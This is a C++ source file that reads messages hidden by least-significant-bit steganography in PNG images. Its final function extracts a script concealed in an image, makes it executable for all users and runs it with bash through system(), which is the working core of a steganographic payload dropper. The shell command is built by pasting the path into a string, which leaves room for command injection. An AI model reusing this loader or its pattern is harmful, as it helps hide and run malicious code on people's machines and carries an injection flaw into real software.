#include "decoder.h"
#include <png.h>
#include <iostream>
#include <vector>
#include <memory>
#include <stdexcept>
#include <fstream>
#include <filesystem> // C++17 for setting permissions

namespace fs = std::filesystem;

// Existing decodeMessageFromPNG implementation
std::string decodeMessageFromPNG(const std::string& imagePath) {
    // RAII for FILE*
    auto fileDeleter = [](FILE* fp) { if (fp) fclose(fp); };
    std::unique_ptr<FILE, decltype(fileDeleter)> fp(fopen(imagePath.c_str(), "rb"), fileDeleter);
    if (!fp) {
        std::cerr << "Error: Unable to open file " << imagePath << std::endl;
        return "";
    }

    // RAII for png_struct and png_info
    class PngReader {
    public:
        PngReader() {
            png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
            if (!png_ptr) {
                throw std::runtime_error("Failed to create png_struct");
            }
            info_ptr = png_create_info_struct(png_ptr);
            if (!info_ptr) {
                png_destroy_read_struct(&png_ptr, nullptr, nullptr);
                throw std::runtime_error("Failed to create png_info");
            }
        }
        ~PngReader() {
            if (png_ptr && info_ptr) {
                png_destroy_read_struct(&png_ptr, &info_ptr, nullptr);
            }
        }
        png_structp png_ptr = nullptr;
        png_infop info_ptr = nullptr;
    };

    try {
        PngReader pngReader;

        if (setjmp(png_jmpbuf(pngReader.png_ptr))) {
            std::cerr << "Error during PNG read initialization" << std::endl;
            return "";
        }

        png_init_io(pngReader.png_ptr, fp.get());
        png_read_info(pngReader.png_ptr, pngReader.info_ptr);

        int width      = png_get_image_width(pngReader.png_ptr, pngReader.info_ptr);
        int height     = png_get_image_height(pngReader.png_ptr, pngReader.info_ptr);
        png_byte color_type = png_get_color_type(pngReader.png_ptr, pngReader.info_ptr);
        png_byte bit_depth  = png_get_bit_depth(pngReader.png_ptr, pngReader.info_ptr);

        // Format check
        if (bit_depth != 8 || (color_type != PNG_COLOR_TYPE_RGB && color_type != PNG_COLOR_TYPE_RGBA)) {
            std::cerr << "Unsupported PNG format. Only 8-bit RGB or RGBA is supported." << std::endl;
            return "";
        }

        png_read_update_info(pngReader.png_ptr, pngReader.info_ptr);

        // Allocate memory for rows using std::vector
        std::vector<std::vector<png_byte>> imageData(height);
        std::vector<png_bytep> rowPointers(height);

        for (int y = 0; y < height; y++) {
            imageData[y].resize(png_get_rowbytes(pngReader.png_ptr, pngReader.info_ptr));
            rowPointers[y] = imageData[y].data();
        }

        png_read_image(pngReader.png_ptr, rowPointers.data());

        // Read bits from image
        std::string binaryData;
        bool hasAlpha = (color_type == PNG_COLOR_TYPE_RGBA);

        for (int y = 0; y < height; ++y) {
            png_bytep row = rowPointers[y];
            for (int x = 0; x < width; ++x) {
                png_bytep px = &(row[x * (hasAlpha ? 4 : 3)]);
                binaryData += (px[2] & 1) ? '1' : '0';
            }
        }

        // Read the first 32 bits to get the message length
        if (binaryData.size() < 32) {
            std::cerr << "Error: Not enough data to read message length." << std::endl;
            return "";
        }

        uint32_t messageLength = 0;
        for (int i = 0; i < 32; i++) {
            messageLength = (messageLength << 1) | (binaryData[i] - '0');
        }

        // Now read the message bits
        size_t totalMessageBits = messageLength * 8;
        if (binaryData.size() < 32 + totalMessageBits) {
            std::cerr << "Error: Not enough data to read the entire message." << std::endl;
            return "";
        }

        std::string binaryMessage = binaryData.substr(32, totalMessageBits);

        std::string decodedMessage;
        decodedMessage.reserve(messageLength);
        for (size_t i = 0; i < binaryMessage.size(); i += 8) {
            std::string byteString = binaryMessage.substr(i, 8);
            char byte = static_cast<char>(std::stoi(byteString, nullptr, 2));
            decodedMessage += byte;
        }

        return decodedMessage;

    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return "";
    }
}

bool decodeFileFromPNG(const std::string& imagePath, const std::string& outputFilePath) {
    std::string decodedData = decodeMessageFromPNG(imagePath);
    if (decodedData.empty()) {
        return false;
    }

    // Write the decoded data to the output file in binary mode
    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        std::cerr << "Error: Unable to open output file " << outputFilePath << std::endl;
        return false;
    }
    outFile.write(decodedData.data(), decodedData.size());
    outFile.close();
    return true;
}

bool decodeAndExecuteScript(const std::string& imagePath, const std::string& outputScriptPath) {
    // Decode the script and save it to the output path
    if (!decodeFileFromPNG(imagePath, outputScriptPath)) {
        std::cerr << "Failed to decode the script from the image." << std::endl;
        return false;
    }

    // Set executable permissions using std::filesystem (C++17)
    try {
        fs::permissions(outputScriptPath,
                        fs::perms::owner_exec | fs::perms::group_exec | fs::perms::others_exec,
                        fs::perm_options::add);
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error while setting permissions: " << e.what() << std::endl;
        return false;
    }

    // Execute the script using system()
    std::string command = "bash \"" + outputScriptPath + "\"";
    int ret = system(command.c_str());
    if (ret != 0) {
        std::cerr << "Error: Script execution failed with return code " << ret << std::endl;
        return false;
    }

    return true;
}
